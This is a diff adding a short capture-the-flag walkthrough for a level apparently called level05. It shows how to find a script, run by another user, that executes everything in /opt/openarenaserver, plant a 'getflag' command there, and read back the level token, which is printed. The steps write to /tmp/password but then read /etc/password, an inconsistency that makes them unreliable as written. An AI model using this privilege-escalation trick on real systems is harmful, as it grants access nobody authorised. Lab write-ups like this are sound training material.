@@ -1,0 +1,24 @@
+
+██╗     ███████╗██╗   ██╗███████╗██╗          ██████╗ ███████╗
+██║     ██╔════╝██║   ██║██╔════╝██║         ██╔═████╗██╔════╝
+██║     █████╗  ██║   ██║█████╗  ██║         ██║██╔██║███████╗
+██║     ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║         ████╔╝██║╚════██║
+███████╗███████╗ ╚████╔╝ ███████╗███████╗    ╚██████╔╝███████║
+╚══════╝╚══════╝  ╚═══╝  ╚══════╝╚══════╝     ╚═════╝ ╚══════╝
+                                                            
+
+find / -uid 3005
+
+cat /usr/sbin/openarenaserver
+
+The script execute the content of all files in /opt/openarenaserver/* and then, delete them.
+
+Create a file in /opt/openarenaserver and put inside the getflag command:
+echo "getflag > /tmp/password" > /opt/openarenaserver/file
+
+Wait until the script is being executed.. 
+
+cat /etc/password
+                                |═══════════════════════════|
+Check flag.Here is your token : | viuaaale9huek52boumoomioc |
+                                |═══════════════════════════|
